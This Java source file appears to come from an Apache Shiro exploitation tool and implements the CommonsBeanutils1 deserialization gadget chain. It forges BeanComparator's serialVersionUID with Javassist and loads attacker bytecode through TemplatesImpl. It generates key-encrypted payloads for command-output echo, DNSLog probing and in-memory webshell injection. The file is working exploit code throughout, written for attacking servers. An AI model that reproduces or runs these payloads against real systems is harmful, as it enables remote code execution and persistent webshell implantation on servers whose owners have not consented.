package com.y5neko.shiroexp.gadget;

import com.y5neko.shiroexp.echo.*;
import com.y5neko.shiroexp.payloads.MemshellLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.y5neko.shiroexp.misc.Tools;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * CommonsBeanutils1_183 利用链
 * 使用 Javassist 动态修改 BeanComparator 的 serialVersionUID 以兼容不同版本
 */
public class CommonsBeanutils1_183 {

    /**
     * 自定义 ClassLoader 用于加载 Javassist 修改后的类
     */
    static class JavassistClassLoader extends ClassLoader {
        public Class<?> loadClass(CtClass ctClass) throws Exception {
            byte[] bytecode = ctClass.toBytecode();
            return defineClass(ctClass.getName(), bytecode, 0, bytecode.length);
        }
    }

    /**
     * 反射设置字段值
     */
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 反射获取字段值
     */
    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    /**
     * 构造CB1_183链payload（动态修改 serialVersionUID）
     * @param clazzBytes 恶意类字节码
     * @return 反序列化payload
     */
    private byte[] getPayload(byte[] clazzBytes) throws Exception {
        // 创建 TemplatesImpl 对象
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        // 使用 Javassist 动态修改 BeanComparator 的 serialVersionUID
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");

        try {
            // 尝试删除原有的 serialVersionUID 字段
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        } catch (NotFoundException e) {
            // 字段不存在，忽略
        }

        // 添加新的 serialVersionUID（固定值以兼容不同版本）
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));

        // 使用自定义 ClassLoader 加载修改后的类
        final Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();

        // 初始使用不触发 getter 的属性
        setFieldValue(beanComparator, "property", "lowestSetBit");

        // 创建 PriorityQueue
        final PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>) beanComparator);

        // 添加 BigInteger 对象（具有 lowestSetBit 方法）
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // 修改 property 为 outputProperties 以触发 TemplatesImpl.getOutputProperties()
        setFieldValue(beanComparator, "property", "outputProperties");

        // 替换队列中的元素为 TemplatesImpl 对象
        Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = obj;
        queueArray[1] = obj;

        // 序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    /**
     * 生成回显payload
     * @param echoType 回显类型
     * @param key 密钥
     * @return 加密后的payload字符串
     */
    public static String genEchoPayload(String echoType, String key) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 根据回显类型生成恶意类
        if (echoType.equals("TomcatEcho")) {
            TomcatEcho tomcatEcho = new TomcatEcho();
            ctClass = tomcatEcho.genPayload(pool);
        } else if (echoType.equals("SpringEcho")) {
            SpringEcho springEcho = new SpringEcho();
            ctClass = springEcho.genPayload(pool);
        } else if (echoType.equals("AllEcho")) {
            AllEcho allEcho = new AllEcho();
            ctClass = allEcho.genPayload(pool);
        } else if (echoType.equals("DNSLogEcho")) {
            // DNSLog 探测
            DNSLogEcho dnsLogEcho = new DNSLogEcho();
            ctClass = dnsLogEcho.genPayload(pool);
        } else {
            throw new Exception("不支持的回显类型: " + echoType);
        }

        // 设置父类为 AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        // 生成反序列化payload
        byte[] payload = new CommonsBeanutils1_183().getPayload(ctClass.toBytecode());
        String data = Base64.getEncoder().encodeToString(payload);
        return Tools.CBC_Encrypt(key, data);
    }

    /**
     * 生成内存马payload
     * @param key 密钥
     * @return 加密后的payload字符串
     */
    public static String genMemPayload(String key) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 使用 MemshellLoader 作为内存马注入器
        MemshellLoader memshellLoader = new MemshellLoader();
        ctClass = memshellLoader.genPayload(pool);

        // 设置父类为 AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        // 生成反序列化payload
        byte[] payload = new CommonsBeanutils1_183().getPayload(ctClass.toBytecode());
        String data = Base64.getEncoder().encodeToString(payload);
        return Tools.CBC_Encrypt(key, data);
    }
}
